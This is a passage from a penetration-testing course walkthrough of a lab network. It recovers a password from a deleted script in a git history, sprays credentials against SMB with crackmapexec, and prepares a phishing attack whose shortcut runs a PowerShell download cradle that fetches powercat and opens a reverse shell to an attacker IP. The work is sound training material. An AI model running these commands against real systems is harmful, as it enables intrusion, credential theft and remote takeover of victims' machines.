the Git repository for sensitive information first.
To do so, we’ll change our current directory to the Git repository. Then, we can use git status to
display the state of the Git working directory and git log to show the commit history.1194
root@websrv1:/home/daniela# cd /srv/www/wordpress/
root@websrv1:/srv/www/wordpress# git status
HEAD detached at 612ff57 y
nothing to commit, working tree clean
root@websrv1:/srv/www/wordpress# git log k
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD -> master)
Author: root 
s
Date: Tue Sep 27 14:26:15 2022 +0000
Removed staging script and internal netwoork access
commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
Author: root  n
Date: Tue Sep 27 14:24:28 2022 +0000
initial commit i
Lzisting 892 - Examining the Git repository
Listing 892 shows that there are two commits in the repository. One is labeled as initial commit
D
and one as Removed staging script and internal network access. That’s quite interesting as it
indicates that the machine previously had access to the internal network. In addition, the first
commit may contain a staging script that was removed.
We could switch back to a specific commit by using git checkout and a commit hash. However,
this could break the functionality of the web application and potentially disrupt the client’s day to
day operations.
A better approach is to use git show, which shows differences between commits. In our case,
we’ll supply the commit hash of the latest commit to the command as we are interested in the
changes after the first commit.
root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root 
Date: Tue Sep 27 14:26:15 2022 +0000
Removed staging script and internal network access
1194 (Git Reference, 2022), https://git-scm.com/docs
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 823
Made in Morocco
Penetration Testing with Kali Linux
diff --git a/fetch_current.sh b/fetch_current.sh
deleted file mode 100644
index 25667c7..0000000
--- a/fetch_current.sh
+++ /dev/null
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-# Script to obtain the current state of the web app from the staging server
-
-sshpass -p "dqsTwTpZPn#nL" rsync PI:EMAIL:/current_webapp/
/srv/www/wordpress/
-
Listing 893 - Displaying the differences between the two commits
Nice! By displaying the differences between commits, we identified another set of credentials. The
y
approach of automating tasks with sshpass1195 is commonly used to provide a password in an
non-interactive way for scripts.
k
Before we conclude this section, let’s add the username and password to creds.txt on our Kali
machine.
s
o
In a real assessment, we should run linPEAS again, once we have obtained
privileged access to the system. Because the tool can now access files of other
users and the system, it may disconver sensitive information and data that wasn’t
accessible when running as daniela.
i
z
Let’s summarize what we’ve achieved in this section. We used the linPEAS automated
enumeration script to identify potentially sensitive information and privilege escalation vectors.
D
The script identified that /usr/bin/git can be run with sudo as user daniela, the WordPress
directory is a Git repository, and a cleartext password is used in the WordPress database settings.
By abusing the sudo command, we successfully elevated our privileges. Then, we identified a
previously removed bash script in the Git repository and displayed it. This script contained a new
username and password.
In the next Learning Unit, we’ll structure and leverage the information we’ve obtained in an attack,
which will provide access to the internal network.
24.3 Gaining Access to the Internal Network
This Learning Unit covers the following Learning Objectives:
• Validate domain credentials from a non-domain-joined machine
• Perform phishing to get access to the internal network
In the previous Learning Unit, we obtained privileged access to WEBSRV1. In addition, we
identified several passwords and usernames.
1195 (Linux Die.Net, 2022), https://linux.die.net/man/1/sshpass
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 824
Made in Morocco
Penetration Testing with Kali Linux
In this Learning Unit, we’ll leverage this information. First, we’ll attempt to confirm a valid set of
credentials and then we’ll use them to get access to the internal network by preparing and
sending a phishing e-mail.
24.3.1 Domain Credentials
In this section, we’ll attempt to identify valid combinations of usernames and passwords on
MAILSRV1. Let’s begin by using the current information in our creds.txt file to create a list of
usernames and passwords. Let’s begin by reviewing the current information in creds.txt.
kali@kali:~/beyond$ cat creds.txt
daniela:tequieromucho (SSH private key passphrase)
wordpress:DanielKeyboard3311 (WordPress database connection settings)
john:dqsTwTpZPn#nL (fetch_current.sh)
y
Other identified users:
marcus
Listing 894 - Displaying contents of crekds.txt
Based on the output in Listing 894, we’ll create a list of usernames containing marcus, john, and
s
daniela. Because wordpress is not a real user but is used for the database connection of the
WordPress instance on WEBSRV1, we’ll omit it. In addition, we’ll create a password list containing
tequieromucho, DanielKeyboard3311, and dqsTwoTpZPn#nL. Both lists and their contents are
shown in the following listing:
n
kali@kali:~/beyond$ cat usernames.txt
marcus
john
i
daniela
z
kali@kali:~/beyond$ cat passwords.txt
tequieromucho
D
DanielKeyboard3311
dqsTwTpZPn#nL
Listing 895 - Displaying the created lists containing the identified usernames and passwords
Now we have two lists containing the usernames and passwords we have identified so far.
Our next step is to use crackmapexec and check these credentials against SMB on MAILSRV1.
We’ll specify --continue-on-success to avoid stopping at the first valid credentials.
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt
--continue-on-success
SMB 192.168.50.242 445 MAILSRV1 [*] Windows 10.0 Build 20348 x64
(name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB 192.168.50.242 445 MAILSRV1 [-]
beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE
SMB 192.168.50.242 445 MAILSRV1 [-]
beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE
SMB 192.168.50.242 445 MAILSRV1 [-]
beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE
SMB 192.168.50.242 445 MAILSRV1 [-] beyond.com\john:tequieromucho
STATUS_LOGON_FAILURE
SMB 192.168.50.242 445 MAILSRV1 [-]
beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 825
Made in Morocco
Penetration Testing with Kali Linux
SMB 192.168.50.242 445 MAILSRV1 [+] beyond.com\john:dqsTwTpZPn#nL
SMB 192.168.50.242 445 MAILSRV1 [-]
beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE
SMB 192.168.50.242 445 MAILSRV1 [-]
beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE
SMB 192.168.50.242 445 MAILSRV1 [-]
beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE
Listing 896 - Checking for valid credentials with CrackMapExec
Listing 896 shows that CrackMapExec identified one valid set of credentials. This isn’t much of a
surprise since we retrieved the username and password from the staging script on WEBSRV1.
However, john could have changed their password in the meantime.
The output shows another great CrackMapExec feature: it identified the domain name and added
it to the usernames. This means that MAILSRV1 is a domain-joined machine and we have
identified a valid set of domain credentials. y
Now that we have valid domain credentials, we need to come up with a plan for our next steps.
k
Reviewing the CrackMapExec output and the port scan for MAILSRV1, we don’t have many
options. We have identified the mail server and SMB, but no services such as WinRM or RDP. In
addition, the scan showed that john is not a local adminsistrator on MAILSRV1 as indicated by the
missing Pwn3d!.
o
This provides us with two options. We can further enumerate SMB on MAILSRV1 and check for
sensitive information on accessible shares or we can prepare a malicious attachment and send a
phishing email as john to daniela and marcuns.
i
We should be aware that CrackMapExec outputs STATUS_LOGON_FAILURE
z
when a password for an existing user is not correct, but also when a user does
not exist at all. Therefore, we cannot be sure at this point that the domain user
D
accounts daniela and marcus even exist.
Let’s choose option one first and leverage CrackMapExec to list the SMB shares and their
permissions on MAILSRV1 by providing --shares and john’s credentials. We may identify
accessible shares containing additional information that we can use for the second option.
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --
shares
SMB 192.168.50.242 445 MAILSRV1 [*] Windows 10.0 Build 20348 x64
(name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB 192.168.50.242 445 MAILSRV1 [+] beyond.com\john:dqsTwTpZPn#nL
SMB 192.168.50.242 445 MAILSRV1 [+] Enumerated shares
SMB 192.168.50.242 445 MAILSRV1 Share Permissions
Remark
SMB 192.168.50.242 445 MAILSRV1 ----- ----------- --
----
SMB 192.168.50.242 445 MAILSRV1 ADMIN$
Remote Admin
SMB 192.168.50.242 445 MAILSRV1 C$
Default share
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 826
Made in Morocco
Penetration Testing with Kali Linux
SMB 192.168.50.242 445 MAILSRV1 IPC$ READ
Remote IPC
Listing 897 - Listing SMB shares on MAILSRV1 with CrackMapExec
Listing 897 shows that CrackMapExec only identified the default shares on which we have no
actionable permissions.
At this point, we only have the second option left, preparing an email with a malicious attachment
and sending it to daniela and marcus.
Let’s summarize what we did in this section. First, we used the information we retrieved in the
previous Learning Unit and leveraged it in a password attack against MAILSRV1. This password
attack resulted in discovering one valid set of credentials. Then, we enumerated the SMB shares
on MAILSRV1 as john without any actionable results.
24.3.2 Phishing for Access y
In this section, we’ll perform a client-side attack by sending ka phishing e-mail. Throughout this
course, we’ve mainly discussed two client-side attack techniques: Microsoft Office documents
containing Macros and Windows Library files in combination with shortcut files.
s
Because we don’t have any information about the internal machines or infrastructure, we’ll
choose the second technique as Microsoft Offioce may not be installed on any of the target
systems.
For this attack, we have to set up a WebDAnV server, a Python3 web server, a Netcat listener, and
prepare the Windows Library and shortcut files.
i
Let’s begin by setting up the WebDAV share on our Kali machine on port 80 with wsgidav. In
addition, we’ll create the /home/kzali/beyond/webdav directory as the WebDAV root directory.
kali@kali:~$ mkdir /home/kali/beyond/webdav
D
kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous -
-root /home/kali/beyond/webdav/
Running without configuration file.
04:47:04.860 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True:
skipping.
04:47:04.861 - INFO : WsgiDAV/4.0.2 Python/3.10.7 Linux-5.18.0-kali7-amd64-x86_64-
with-glibc2.34
04:47:04.861 - INFO : Lock manager: LockManager(LockStorageDict)
04:47:04.861 - INFO : Property manager: None
04:47:04.861 - INFO : Domain controller: SimpleDomainController()
04:47:04.861 - INFO : Registered DAV providers by route:
04:47:04.861 - INFO : - '/:dir_browser': FilesystemProvider for path
'/home/kali/.local/lib/python3.10/site-packages/wsgidav/dir_browser/htdocs' (Read-
Only) (anonymous)
04:47:04.861 - INFO : - '/': FilesystemProvider for path
'/home/kali/beyond/webdav' (Read-Write) (anonymous)
04:47:04.861 - WARNING : Basic authentication is enabled: It is highly recommended to
enable SSL.
04:47:04.861 - WARNING : Share '/' will allow anonymous write access.
04:47:04.861 - WARNING : Share '/:dir_browser' will allow anonymous read access.
04:47:05.149 - INFO : Running WsgiDAV/4.0.2 Cheroot/8.6.0 Python 3.10.7
04:47:05.149 - INFO : Serving on http://0.0.0.0:80 ...
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 827
Made in Morocco
Penetration Testing with Kali Linux
Listing 898 - Starting WsgiDAV on port 80
Listing 898 shows that our WebDAV share is now served on port 80 with anonymous access
settings.
Now, let’s connect to WINPREP via RDP as offsec with a password of lab in order to prepare the
Windows Library and shortcut files. Once connected, we’ll open Visual Studio Code1196 and create
a new text file on the desktop named config.Library-ms.
y
k
s
o
n
i
z
D
Figure 293: Empty Library file in Visual Studio Code
Now, let’s copy the Windows Library code we previously used in the Client-Side Attacks Module,
paste it into Visual Studio Code, and check that the IP address points to our Kali machine.
@windows.storage.dll,-34582
6
true
imageres.dll,-1003
1196 (Visual Studio, 2022), https://code.visualstudio.com/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 828
Made in Morocco
Penetration Testing with Kali Linux
{7d49d726-3c21-4f05-99aa-fdc2c9474656}
true
false
http://192.168.119.5
Listing 899 - Windows Library code for connecting to our WebDAV Share
Let’s save the file and transfer it to /home/kali/beyond on our Kali machine.
y
Next, we’ll create the shortcut file on WINPREP. For this, we’ll right-click on the Desktop and select
New > Shortcut. A victim double-clicking the shortcut file willk download PowerCat and create a
reverse shell. We can enter the following command to achieve this:
s
powershell.exe -c "IEX(New-Object
System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1');
powercat -c 192.168.119.5 -p 4444 -e powersheoll"
Listing 900 - PowerShell Download Cradle and PowerCat Reverse Shell Execution for shortcut file
Once we enter the command and install nas shortcut file name, we can transfer the resulting
shortcut file to our Kali machine into the WebDAV directory.
Our next step is to serve PowerCiat via a Python3 web server. Let’s copy powercat.ps1 to
/home/kali/beyond and serve it ozn port 8000 as we have specified in the shortcut’s PowerShell
command.
D